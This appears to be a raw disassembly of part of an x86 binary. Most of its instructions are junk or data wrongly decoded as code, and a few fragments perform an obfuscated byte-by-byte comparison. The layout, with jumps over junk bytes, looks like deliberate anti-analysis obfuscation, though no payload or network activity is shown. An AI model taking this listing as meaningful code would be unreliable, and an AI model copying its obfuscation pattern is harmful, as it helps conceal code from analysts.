  407fb0:	jl     0x40802a
  407fb2:	arpl   WORD PTR [edi],bx
  407fb4:	and    al,0x7e
  407fb6:	out    0xfb,eax
  407fb8:	jmp    0x407fe7
  407fba:	test   al,0xbb
  407fbc:	cmp    dh,BYTE PTR [ebx-0x458987ea]
  407fc2:	pop    ecx
  407fc3:	nop
  407fc4:	fwait
  407fc5:	inc    ebp
  407fc6:	imul   edi,DWORD PTR [ebx-0x67],0xe312d7e9
  407fcd:	es aaa 
  407fcf:	sti    
  407fd0:	dec    edx
  407fd1:	pop    edx
  407fd2:	je     0x407fb6
  407fd4:	inc    esp
  407fd5:	pop    ebx
  407fd6:	fiadd  WORD PTR [edx-0x5de5a2e4]
  407fdc:	mov    edx,0x2e4990e5
  407fe1:	(bad)  
  407fe3:	mul    BYTE PTR [ebp+0x13]
  407fe6:	pop    ebp
  407fe7:	xor    al,0x39
  407fe9:	and    al,0xa
  407feb:	adc    BYTE PTR [edx+0x7db34e6f],dl
  407ff1:	hlt    
  407ff2:	cmp    dl,BYTE PTR [edx+0x27d72895]
  407ff8:	int    0xaf
  407ffa:	sbb    al,0x4f
  407ffc:	sbb    ecx,ebp
  407ffe:	lods   al,BYTE PTR gs:[esi]
  408000:	mov    ds:0xb60b788e,eax
  408005:	mov    bl,0x52
  408007:	stos   BYTE PTR es:[edi],al
  408008:	cld    
  408009:	(bad)  
  40800b:	dec    ecx
  40800c:	pop    esp
  40800d:	rcl    esi,cl
  40800f:	sar    BYTE PTR [ebx-0x21f36006],1
  408015:	mov    ds:0x708107fa,eax
  40801a:	dec    DWORD PTR [edx+0x35]
  40801d:	and    BYTE PTR [ebx],dl
  40801f:	xchg   ebx,eax
  408020:	retf   0x13f8
  408023:	fwait
  408024:	dec    ecx
  408025:	(bad)  
  408026:	jbe    0x407ff2
  408028:	out    0x11,al
  40802a:	mov    edi,0x9136cc8b
  40802f:	cmp    al,0xf7
  408031:	inc    ebp
  408032:	shl    BYTE PTR [ebx+0x47],0x15
  408036:	loopne 0x408047
  408038:	(bad)  
  408039:	std    
  40803a:	in     al,dx
  40803b:	cmc    
  40803c:	or     BYTE PTR [esi-0x1e],al
  40803f:	mov    ah,0xbd
  408041:	and    eax,0x8be514cc
  408046:	test   DWORD PTR [ebx+0x69],ecx
  408049:	cmp    al,0x6f
  40804b:	add    eax,0xe71661ed
  408050:	scas   eax,DWORD PTR es:[edi]
  408051:	ins    DWORD PTR es:[edi],dx
  408052:	nop
  408053:	das    
  408054:	inc    edi
  408055:	mov    BYTE PTR [ecx],bh
  408057:	cmc    
  408058:	dec    ebp
  408059:	add    DWORD PTR [edi],edx
  40805b:	in     al,dx
  40805c:	ja     0x40808f
  40805e:	cdq    
  40805f:	cmp    eax,0x85d9512a
  408064:	mov    dl,BYTE PTR [eax-0x4401ae03]
  40806a:	in     al,0x8b
  40806c:	jle    0x4080c2
  40806e:	shr    DWORD PTR [edi-0x49f2a4d0],0x40
  408075:	cmp    bl,BYTE PTR [ebx]
  408077:	lock ret 0xb74d
  40807b:	repz (bad) 
  40807e:	lock push cs
  408080:	loop   0x408087
  408082:	mov    eax,ds:0xeef90c5c
  408087:	arpl   WORD PTR [esi-0xeaaf1aa],si
  40808d:	out    0x78,al
  40808f:	add    esi,ebx
  408091:	retfw  
  408093:	xor    ebx,DWORD PTR ds:0x4014af07
  408099:	popa   
  40809a:	test   al,0x53
  40809c:	jg     0x408062
  40809e:	mov    edx,0xe2a66aca
  4080a3:	(bad)  
  4080a4:	pop    eax
  4080a5:	xchg   esi,eax
  4080a6:	push   ds
  4080a7:	or     cl,BYTE PTR [edx+0x10]
  4080aa:	dec    edi
  4080ab:	jo     0x40805d
  4080ad:	lods   eax,DWORD PTR ds:[esi]
  4080ae:	lea    eax,[esi+0x3cf6961]
  4080b4:	dec    edi
  4080b5:	xor    DWORD PTR [eax+0xf],edi
  4080b8:	mov    ds:0x744ac521,eax
  4080bd:	xchg   edx,eax
  4080be:	jmp    0x408098
  4080c0:	adc    BYTE PTR [eax+0x10e0c5b0],ah
  4080c6:	(bad)  [edi+0x2a]
  4080c9:	pop    es
  4080ca:	inc    ebx
  4080cb:	cmp    al,0x51
  4080cd:	loopne 0x4080a8
  4080cf:	sti    
  4080d0:	retf   0xc133
  4080d3:	add    eax,esi
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx-0x77d7ca8b],eax
  4080f8:	or     eax,0x7878ddf4
  4080fd:	fs jle 0x408178
  408100:	js     0x40817a
  408102:	push   0xc
  408104:	pop    edx
  408105:	test   al,dl
  408107:	xchg   ebp,eax
  408108:	inc    edi
  408109:	and    eax,0x1e1965
  40810e:	pushf  
  40810f:	xor    eax,0xbd768584
  408114:	cli    
  408115:	mov    ebp,0xd0dde036
  40811a:	sbb    cl,ch
  40811c:	sub    ch,BYTE PTR [ecx-0x49b40889]
  408122:	mov    eax,0x1ea8b190
  408127:	mov    al,0x7d
  408129:	shl    dl,cl
  40812b:	hlt    
  40812c:	inc    eax
  40812d:	add    al,0xa6
  40812f:	jb     0x408105
  408131:	xor    al,0xb4
  408133:	mov    eax,0x51a5798f
  408138:	or     DWORD PTR [edx],edx
  40813a:	add    bl,BYTE PTR [ebp-0x57]
  40813d:	test   al,0x6
  40813f:	mov    ecx,0x2a9c5391
  408144:	jo     0x408139
  408146:	stc    
  408147:	das    
  408148:	xchg   ecx,eax
  408149:	es push esi
  40814b:	int3   
  40814c:	pop    ebx
  40814d:	push   esp
  40814e:	or     eax,0x1eeb6738
  408153:	call   0xc764:0x13a9373b
  40815a:	mov    esi,0x1ead291c
  40815f:	out    dx,eax
  408160:	inc    edx
  408161:	outs   dx,DWORD PTR ds:[esi]
  408162:	pop    ss
  408163:	sar    DWORD PTR [edx+0x27c6a6d0],1
  408169:	mov    ebp,0xe02c3afc
  40816e:	push   edx
  40816f:	lds    esi,FWORD PTR [edi+edi*1]
  408172:	loope  0x40812d
  408174:	es imul ebx,ebp,0x1c61393a
  40817b:	rol    esi,cl
  40817d:	gs sti 
  40817f:	cld    
  408180:	mov    edx,0x95fb82f6
  408185:	ret    
  408186:	das    
  408187:	add    dh,BYTE PTR [edi-0x3f4cc595]
  40818d:	push   es
  40818e:	(bad)  
  40818f:	pop    edi
  408190:	pop    esp
  408191:	dec    eax
  408192:	push   cs
  408193:	daa    
  408194:	mov    al,0x9b
  408196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408197:	xor    al,0xca
  408199:	cwde   
  40819a:	push   edi
  40819b:	jmp    0xdbe7:0x2c64169c
  4081a2:	(bad)  
  4081a3:	mov    ecx,0x55e0b74
  4081a8:	rol    esp,0x85
  4081ab:	mov    DWORD PTR [ecx+0x1bc21ca],ebx
  4081b1:	or     al,0xd1
  4081b3:	sub    DWORD PTR ds:[eax+0x2d],ecx
  4081b7:	sub    ch,BYTE PTR [ecx+0x1949655a]
  4081bd:	push   es
  4081be:	inc    ebp
  4081bf:	sti    
  4081c0:	daa    
  4081c1:	xor    ebp,ebx
  4081c3:	add    DWORD PTR [eax-0x532fdb47],0x628a6401
  4081cd:	lods   eax,DWORD PTR ds:[esi]
  4081ce:	cwde   
  4081cf:	jo     0x890042b8
  4081d5:	adc    eax,DWORD PTR [edi+0x451465e7]
  4081db:	loopne 0x408185
  4081dd:	call   0xd9f48c3f
  4081e2:	idiv   DWORD PTR [ebx]
  4081e4:	mov    esp,0x4a3f6302
  4081e9:	or     edx,esi
  4081eb:	and    eax,0xdc370c6e
  4081f0:	or     al,0x25
  4081f2:	test   BYTE PTR [eax+ebx*4],ch
  4081f5:	jmp    0x2ab8:0xa3edec1d
  4081fc:	test   BYTE PTR [edx-0x20],0x85
  408200:	add    DWORD PTR [ecx+0x4f2b6bcb],edi
  408206:	adc    edi,edi
  408208:	or     bh,ch
  40820a:	jo     0x40822f
  40820c:	in     al,dx
  40820d:	fadd   QWORD PTR [esp+ebp*1+0x15]
  408211:	lea    esp,[edi+0x72]
  408214:	fsubr  QWORD PTR [esi]
  408216:	repnz in al,0xdf
  408219:	clc    
  40821a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40821b:	sti    
  40821c:	and    ecx,esi
  40821e:	out    dx,eax
  40821f:	sub    DWORD PTR [edi],edi
  408221:	dec    ecx
  408222:	mov    ecx,0x2c259dd2
  408227:	mov    ds:0x2fd7894e,al
  40822c:	push   edi
  40822d:	scas   al,BYTE PTR es:[edi]
  40822e:	mov    dl,0x9
  408230:	aas    
  408231:	jecxz  0x408284
  408233:	mov    esi,0xa06bdfb
  408238:	dec    edx
  408239:	inc    edi
  40823a:	push   0x74
  40823c:	int3   
  40823d:	rcl    BYTE PTR [eax-0x521dd4f6],1
  408243:	sbb    ecx,0x2df880c5
  408249:	cdq    
  40824a:	cmp    DWORD PTR [ebx],0xffffffb4
  40824d:	jle    0x40824b
  40824f:	fisttp QWORD PTR [edi+ebp*2+0x55]
  408253:	ret    
  408254:	jne    0x408253
  408256:	sar    ebp,cl
  408258:	pop    es
  408259:	retf   
  40825a:	push   edi
  40825b:	scas   al,BYTE PTR es:[edi]
  40825c:	retf   
  40825d:	inc    eax
  40825e:	pop    edx
  40825f:	mov    esi,DWORD PTR [esi]
  408261:	cmc    
  408262:	adc    al,0xb1
  408264:	out    0x93,al
  408266:	mov    esp,0x20ffd686
  40826b:	scas   eax,DWORD PTR es:[edi]
  40826c:	stos   DWORD PTR es:[edi],eax
  40826d:	fist   DWORD PTR [esi]
  40826f:	xchg   ebx,eax
  408270:	bound  eax,QWORD PTR [ebx+0x57]
  408273:	cmc    
  408274:	or     esp,ebp
  408276:	xor    al,0xb4
  408278:	mov    edx,0xafce4afc
  40827d:	(bad)
  408281:	(bad)  
  408283:	nop
  408284:	test   BYTE PTR [edi],ch
  408286:	retf   
  408287:	mov    cl,0x72
  408289:	mov    ecx,edi
  40828b:	ins    DWORD PTR es:[edi],dx
  40828c:	jae    0x4082aa
  40828e:	jmp    0xca47c973
  408293:	xlat   BYTE PTR ds:[ebx]
  408294:	inc    edx
  408295:	cwde   
  408296:	lahf   
  408297:	ins    DWORD PTR es:[edi],dx
  408298:	mov    dl,0x98
  40829a:	out    0x36,al
  40829c:	jmp    0x546f:0xe73ad0f0
  4082a3:	fidiv  WORD PTR [edx+0x4af41ac7]
  4082a9:	call   0x1b3c623d
  4082ae:	cmp    eax,0x92aedde9
  4082b3:	inc    edi
  4082b4:	push   esi
  4082b5:	outs   dx,DWORD PTR ds:[esi]
  4082b6:	dec    BYTE PTR [edx-0x5dd0b56d]
  4082bc:	fwait
  4082bd:	clc    
  4082be:	pushf  
  4082bf:	mov    ebp,0x7686d7b
  4082c4:	mov    ds:0xb7909488,eax
  4082c9:	jl     0x40826c
  4082cb:	sub    DWORD PTR [ebx],edi
  4082cd:	bound  ebp,QWORD PTR [edi+0x38405cc3]
  4082d3:	jmp    0x61e195e6
  4082d8:	and    DWORD PTR [ecx],edx
  4082da:	inc    ebx
  4082db:	xor    DWORD PTR [edx+esi*4],esi
  4082de:	sahf   
  4082df:	mov    ah,0xad
  4082e1:	in     eax,dx
  4082e2:	mov    ah,0x48
  4082e4:	pushf  
  4082e5:	pop    ds
  4082e6:	pop    esi
  4082e7:	enter  0x9d4c,0x7f
  4082eb:	ins    DWORD PTR es:[edi],dx
  4082ec:	fst    st(4)
  4082ee:	gs sbb bl,0xc7
  4082f2:	pop    es
  4082f3:	and    BYTE PTR [edi+0x3],0x2
  4082f7:	jmp    0x2aa8af8a
  4082fc:	fisttp QWORD PTR [edi]
  4082fe:	pop    ds
  4082ff:	inc    esp
  408300:	enter  0xf3da,0x2c
  408304:	ds rol ebx,1
  408307:	mov    ah,BYTE PTR [ebx]
  408309:	test   DWORD PTR [ebp+0x402b6260],0xd09f3ae
  408313:	inc    edi
  408314:	cmp    eax,eax
  408316:	sub    bl,dh
  408318:	fimul  WORD PTR [ebp+0x4b522adc]
  40831e:	mov    ah,0xe
  408320:	ret    0xbdbb
  408323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408324:	xor    eax,0x7eb0290d
  408329:	test   DWORD PTR [edi-0x40122a51],0x84acb12b
  408333:	cmp    BYTE PTR [edx+0x71e33a5],bh
  408339:	or     al,0xec
  40833b:	mov    eax,DWORD PTR ss:[si+0x1ae5]
  408341:	int3   
  408342:	mov    esp,DWORD PTR [eax]
  408344:	push   es
  408345:	cvtdq2ps xmm1,XMMWORD PTR [eax-0x6ebeac54]
  40834c:	xchg   ebp,eax
  40834d:	xor    ebx,DWORD PTR [esi+edi*8]
  408350:	mov    al,ds:0x198173cd
  408355:	lods   eax,DWORD PTR ds:[esi]
  408356:	aad    0xc0
  408358:	add    eax,ebx
  40835a:	dec    bh
  40835c:	dec    esi
  40835d:	sub    bh,ah
  40835f:	rcl    DWORD PTR [esi+eax*1+0x5a9091e4],1
  408366:	add    eax,0xd0f699ed
  40836b:	or     ecx,0x2e916c44
  408371:	in     eax,0x47
  408373:	sbb    al,0xaa
  408375:	mov    cl,0x3a
  408377:	lods   al,BYTE PTR ds:[esi]
  408378:	mov    dh,0x9d
  40837a:	stos   DWORD PTR es:[edi],eax
  40837b:	icebp  
  40837c:	je     0x408339
  40837e:	into   
  40837f:	xchg   esp,eax
  408380:	(bad)  
  408382:	ds loop 0x40831e
  408385:	cmp    BYTE PTR [edx+eiz*8],dh
  408388:	pop    edi
  408389:	js     0x408334
  40838b:	je     0x4083ab
  40838d:	jg     0x4083ac
  40838f:	ret    0x8bbd
  408392:	ss mov eax,0x9e0c9c4b
  408398:	jae    0x40834e
  40839a:	das    
  40839b:	bnd jae 0x408362
  40839e:	hlt    
  40839f:	pop    ecx
  4083a0:	cwde   
  4083a1:	push   ebx
  4083a2:	nop
  4083a3:	test   al,0x3c
  4083a5:	xor    al,BYTE PTR [esi+0x6b]
  4083a8:	jne    0x40840f
  4083aa:	push   0xffffffed
  4083ac:	stos   BYTE PTR es:[edi],al
  4083ad:	fild   QWORD PTR [eax]
  4083af:	jge    0x408359
  4083b1:	stc    
  4083b2:	(bad)  
  4083b3:	push   ebp
  4083b4:	ror    DWORD PTR ds:0xeba5a44,0xe2
  4083bb:	dec    ebx
  4083bc:	adc    BYTE PTR [ebp+0x724d71fe],0xcb
  4083c3:	or     ch,BYTE PTR ds:0x816ade70
  4083c9:	aaa    
  4083ca:	lods   eax,DWORD PTR ds:[esi]
  4083cb:	add    BYTE PTR [esi-0x6c9d4069],bh
  4083d1:	dec    edx
  4083d2:	add    al,0x48
  4083d4:	ja     0x408369
  4083d6:	test   eax,0x1b9a1392
  4083db:	nop
  4083dc:	loopne 0x408399
  4083de:	or     DWORD PTR ds:0x78fd2ff1,ebx
  4083e4:	loopne 0x408447
  4083e6:	mov    dh,0xd3
  4083e8:	or     DWORD PTR ds:[eax+0x6b],edx
  4083ec:	jnp    0x408378
  4083ee:	inc    esp
  4083ef:	add    eax,0xff558aa8
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi-0x6465ac0b],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x408444
  408448:	cmp    ah,BYTE PTR [edi-0x1bee85a2]
  40844e:	sub    al,0x77
  408450:	test   DWORD PTR [edi-0x4424b32a],edi
  408456:	(bad)
  408459:	out    dx,al
  40845a:	and    BYTE PTR fs:[ebp-0x18c0fb8b],dl
  408461:	test   eax,0xcbf60fdf
  408466:	mov    ds:0x8e710b54,al
  40846b:	daa    
  40846c:	sub    DWORD PTR [ecx+0x3d],ebp
  40846f:	sahf   
  408470:	mov    cl,0x84
  408472:	xor    dl,dl
  408474:	adc    dh,dh
  408476:	mov    eax,0xaf530993
  40847b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40847c:	pop    edi
  40847d:	mov    cl,0x64
  40847f:	iret   
  408480:	cmp    bh,BYTE PTR [eax+0x3f]
  408483:	adc    eax,0x2c5aa5e0
  408488:	mov    bl,0x1b
  40848a:	adc    bl,BYTE PTR [esi+0x4e]
  40848d:	inc    esp
  40848e:	xchg   edi,eax
  40848f:	jne    0x4084b8
  408491:	pop    ss
  408492:	sub    al,0x2f
  408494:	pop    ecx
  408495:	(bad)  
  408497:	sub    al,0x3e
  408499:	fdiv   DWORD PTR [esi-0x53]
  40849c:	sub    eax,0xc7de8817
  4084a1:	jb     0x408462
  4084a3:	aad    0xa6
  4084a5:	test   eax,0xb074d1ef
  4084aa:	mov    esi,DWORD PTR ds:0x39c37235
  4084b0:	sub    al,0x2e
  4084b2:	push   eax
  4084b3:	fcom   QWORD PTR [ecx-0x33]
  4084b6:	mov    esi,0x6a678e5f
  4084bb:	pop    ss
  4084bc:	imul   edi,DWORD PTR [edx-0x333f6191],0x6404ffcb
  4084c6:	sub    eax,0xdebc689b
  4084cb:	icebp  
  4084cc:	neg    ah
  4084ce:	lock pop eax
  4084d0:	in     al,dx
  4084d1:	mov    cs,WORD PTR [eax+0x63c3d146]
  4084d7:	dec    edx
  4084d8:	adc    edi,ebp
  4084da:	push   0x59ea117e
  4084df:	push   ecx
  4084e0:	cmp    BYTE PTR [edi-0x212c9b3e],ch
  4084e6:	xchg   ebp,eax
  4084e7:	retf   0xebee
  4084ea:	mov    DWORD PTR [eax],0x8e5a8216
  4084f0:	cmc    
  4084f1:	enter  0xcfed,0x2b
  4084f5:	stos   BYTE PTR es:[edi],al
  4084f6:	push   ebp
  4084f7:	and    eax,0x441f1682
  4084fc:	loop   0x4084b0
  4084fe:	add    ch,BYTE PTR [ebp+0x2e8835ee]
  408504:	aam    0x9e
  408506:	add    DWORD PTR [esi-0x4050eb6b],eax
  40850c:	xor    DWORD PTR [edx+0x12a30b64],ecx
  408512:	add    eax,0xc2d50ea1
  408517:	add    DWORD PTR [edx+0x2a8ba972],esp
  40851d:	pop    es
  40851e:	repnz mov dh,0x2a
  408521:	stc    
  408522:	pusha  
  408523:	jecxz  0x4084f9
  408525:	ficomp DWORD PTR [edx+0x5ce1ac06]
  40852b:	add    eax,0x9e9f4710
  408530:	inc    edi
  408531:	lock popf 
  408533:	inc    ebx
  408534:	jle    0x40850d
  408536:	ds iret 
  408538:	mov    WORD PTR [esi],es
  40853a:	add    BYTE PTR ds:0x39963cdf,bh
  408540:	ins    DWORD PTR es:[edi],dx
  408541:	xchg   esp,esp
  408543:	jnp    0x408560
  408545:	test   ebx,ebx
  408547:	int3   
  408548:	(bad)  
  408549:	shl    BYTE PTR [ecx],0x1c
  40854c:	mov    ds:0xf143ba11,al
  408551:	shl    BYTE PTR [esi+0xb490559],0x59
  408558:	int    0x23
  40855a:	das    
  40855b:	in     al,dx
  40855c:	sub    eax,0x78c084
  408561:	popa   
  408562:	pop    es
  408563:	(bad)  
  408564:	bound  edx,QWORD PTR [edi]
  408566:	jns    0x40859c
  408568:	or     eax,0x9a5af674
  40856d:	test   al,0x90
  40856f:	pop    esi
  408570:	(bad)  
  408571:	fldenv [ebx+ecx*4+0x46]
  408575:	ret    
  408576:	ja     0x408536
  408578:	inc    ebp
  408579:	inc    esp
  40857a:	fwait
  40857b:	sbb    DWORD PTR [ecx],esp
  40857d:	jo     0x4085d5
  40857f:	fild   WORD PTR [ebx+ecx*1+0x24]
  408583:	ins    BYTE PTR es:[edi],dx
  408584:	ins    DWORD PTR es:[edi],dx
  408585:	mov    edx,DWORD PTR [eax]
  408587:	sub    DWORD PTR [ebx+0x9],ebx
  40858a:	sahf   
  40858b:	jnp    0x4085e9
  40858d:	adc    eax,0x2d431a
  408592:	jns    0x40853f
  408594:	stc    
  408595:	sub    eax,0xf1bda124
  40859a:	stos   BYTE PTR es:[edi],al
  40859b:	sahf   
  40859c:	cmp    BYTE PTR [ebx-0x37],bl
  40859f:	push   ebp
  4085a0:	and    eax,ebx
  4085a2:	in     eax,0x6e
  4085a4:	shr    BYTE PTR [ebx-0x3f286e9d],1
  4085aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085ab:	jnp    0x4085e3
  4085ad:	jmp    0x12c7:0xf57af87b
  4085b4:	ins    DWORD PTR es:[edi],dx
  4085b5:	int    0x1e
  4085b7:	(bad)
  4085bb:	cmp    eax,0xc5e877ff
  4085c0:	mov    cl,0xa
  4085c2:	xchg   edx,eax
  4085c3:	(bad)  
  4085c5:	xor    al,BYTE PTR [eax+0x39]
  4085c8:	popf   
  4085c9:	sbb    dh,cl
  4085cb:	cmp    eax,0x4d9a855c
  4085d0:	in     eax,0x93
  4085d2:	aad    0x46
  4085d4:	push   esp
  4085d5:	jp     0x4085c7
  4085d7:	adc    al,0x31
  4085d9:	jo     0x408635
  4085db:	mov    edi,0x815aa294
  4085e0:	sbb    al,bh
  4085e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085e3:	xor    al,ch
  4085e5:	jae    0x4085c6
  4085e7:	test   DWORD PTR [eax+ebp*1-0x57],edx
  4085eb:	xor    edx,DWORD PTR [ebx-0x4a]
  4085ee:	pop    ecx
  4085ef:	out    0x8a,al
  4085f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085f2:	push   0xffffff90
  4085f4:	scas   eax,DWORD PTR es:[edi]
  4085f5:	pop    eax
  4085f6:	retf   0x46ad
  4085f9:	add    al,0xa2
  4085fb:	call   0xd01f2d90
  408600:	inc    ecx
  408601:	push   edi
  408602:	xchg   edi,eax
  408603:	jle    0x4085da
  408605:	xor    cl,BYTE PTR [eax]
  408607:	aas    
  408608:	mov    DWORD PTR [ebp-0x4a],edx
  40860b:	dec    ebx
  40860c:	push   esp
  40860d:	pop    es
  40860e:	inc    ecx
  40860f:	xor    DWORD PTR ds:0xc7cefac2,esp
  408615:	loope  0x4085e6
  408617:	adc    eax,0xdabd6155
  40861c:	jbe    0x4085f3
  40861e:	push   0x5f
  408620:	xor    edi,DWORD PTR [ecx-0x14db3498]
  408626:	or     BYTE PTR [ebp+0x467c5a0a],0x36
  40862d:	jne    0x4085de
  40862f:	pop    esi
  408630:	mov    ecx,0xd0903d6c
  408635:	scas   al,BYTE PTR es:[edi]
  408636:	mov    ecx,0xae015725
  40863b:	fdivr  QWORD PTR [edi-0x7c370e15]
  408641:	adc    eax,0xdc168c10
  408646:	jo     0x40863e
  408648:	mov    ch,0xf9
  40864a:	add    eax,0x4e919d09
  40864f:	mov    bl,0x59
  408651:	sbb    al,0x5c
  408653:	push   esi
  408654:	fisubr WORD PTR [ecx-0x5d0939]
  40865a:	jge    0x40866a
  40865c:	test   BYTE PTR [eax+0xa09421],0x70
  408663:	inc    ecx
  408664:	cli    
  408665:	and    BYTE PTR [esi-0x4b],cl
  408668:	loop   0x40864f
  40866a:	sbb    al,0x9a
  40866c:	std    
  40866d:	sbb    BYTE PTR [ecx],ch
  40866f:	popa   
  408670:	fmul   DWORD PTR [esi+edi*4+0x1ed187e5]
  408677:	nop
  408678:	je     0x4086a3
  40867a:	ret    
  40867b:	(bad)  
  40867c:	fdivr  QWORD PTR [edi]
  40867e:	dec    edi
  40867f:	or     al,0xf2
  408681:	cwde   
  408682:	mov    ds:0x4389e64,al
  408687:	push   eax
  408688:	stc    
  408689:	ja     0x40864e
  40868b:	adc    al,0xe1
  40868d:	add    ah,BYTE PTR [eax+0x13a5288d]
  408693:	or     BYTE PTR [ebx],cl
  408695:	std    
  408696:	inc    ecx
  408697:	les    edi,FWORD PTR [edx-0x166bec53]
  40869d:	inc    edx
  40869e:	mov    DWORD PTR [edx-0x68a5aefe],eax
  4086a4:	pop    edi
  4086a5:	add    DWORD PTR [ecx],ebp
  4086a7:	pop    ebp
  4086a8:	out    0x93,eax
  4086aa:	dec    ecx
  4086ab:	pop    ebp
  4086ac:	rol    edi,1
  4086ae:	setbe  BYTE PTR [ecx+esi*8]
  4086b2:	lods   al,BYTE PTR ds:[esi]
  4086b3:	leave  
  4086b4:	add    cl,BYTE PTR [ebp+ebx*4+0x605874a0]
  4086bb:	sbb    ah,dh
  4086bd:	or     BYTE PTR [ecx-0x6e2c4f89],dh
  4086c3:	mov    esi,0x96855886
  4086c8:	stos   BYTE PTR es:[edi],al
  4086c9:	push   esp
  4086ca:	mov    ch,0x85
  4086cc:	inc    edi
  4086cd:	scas   al,BYTE PTR es:[edi]
  4086ce:	inc    ebx
  4086cf:	add    dh,dl
  4086d1:	frstor [edi-0x66]
  4086d4:	imul   esi,DWORD PTR [eax+ebx*2-0x4b],0x57
  4086d9:	jbe    0x40873c
  4086db:	add    eax,0xcb23be1d
  4086e0:	rcl    ebp,0xb3
  4086e3:	hlt    
  4086e4:	cs inc ebx
  4086e6:	stc    
  4086e7:	lods   eax,DWORD PTR ds:[esi]
  4086e8:	push   esp
  4086e9:	mov    al,0x9e
  4086eb:	mov    esp,edx
  4086ed:	dec    edx
  4086ee:	dec    ebp
  4086ef:	or     BYTE PTR [esi+0x58],0x14
  4086f3:	add    DWORD PTR [ebp+0x6a38165d],edi
  4086f9:	xor    bh,BYTE PTR [eax-0x1e157f63]
  4086ff:	shl    DWORD PTR [edi+0x72],1
  408702:	xchg   edx,eax
  408703:	fwait
  408704:	sbb    esp,DWORD PTR [eax-0x34c6e122]
  40870a:	xor    al,0x64
  40870c:	fistp  DWORD PTR [esi]
  40870e:	add    eax,ecx
  408710:	imul   ebx,DWORD PTR [eax+0x1a],0xb536d4c1
  408717:	sahf   
  408718:	inc    ebx
  408719:	int3   
  40871a:	aas    
  40871b:	arpl   WORD PTR [edi],bp
  40871d:	enter  0x7fb8,0x93
  408721:	faddp  st(7),st
  408723:	add    eax,0x67c18fd5
  408728:	gs popa 
  40872a:	shr    DWORD PTR [eax],cl
  40872c:	push   ebp
  40872d:	into   
  40872e:	xchg   ebx,eax
  40872f:	aas    
  408730:	and    al,0xcb
  408732:	jge    0x45ca6f7d
  408738:	in     al,dx
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	call   0xccaffd96
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x4087d3
  408784:	stos   BYTE PTR es:[edi],al
  408785:	and    al,0x84
  408787:	cwde   
  408788:	push   esp
  408789:	push   0x61
  40878b:	adc    esi,ebx
  40878d:	xor    dh,BYTE PTR [edi-0x61]
  408790:	and    ecx,DWORD PTR [ecx-0x3084c597]
  408796:	or     eax,0x92a47ffc
  40879b:	push   edx
  40879c:	cmp    BYTE PTR [ecx-0x2f0386e4],bl
  4087a2:	cmp    al,0x1f
  4087a4:	pop    ss
  4087a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087a6:	je     0x4087c3
  4087a8:	(bad)  
  4087a9:	dec    edi
  4087aa:	call   0xe721:0xa1c006d4
  4087b1:	test   al,0xc5
  4087b3:	inc    ebx
  4087b4:	xor    BYTE PTR [esi+0x76],0x6f
  4087b8:	bound  esi,QWORD PTR [eax-0xc3fd14f]
  4087be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087bf:	xchg   esi,eax
  4087c0:	pop    esi
  4087c1:	aad    0x68
  4087c3:	sbb    BYTE PTR [ebx+eiz*2-0x29],dl
  4087c7:	dec    ebp
  4087c8:	aad    0x7e
  4087ca:	or     BYTE PTR [ebx+esi*2+0x23623efc],dl
  4087d1:	adc    ecx,DWORD PTR [ecx+0x40]
  4087d4:	sbb    DWORD PTR [edi-0xed5dab2],edi
  4087da:	fldenv [edi]
  4087dc:	call   0x8e0f:0xc325298
  4087e3:	shr    al,cl
  4087e5:	xlat   BYTE PTR ds:[ebx]
  4087e6:	pop    ss
  4087e7:	xor    al,0x90
  4087e9:	mov    esp,0x1908e564
  4087ee:	jb     0x4087a4
  4087f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087f1:	nop
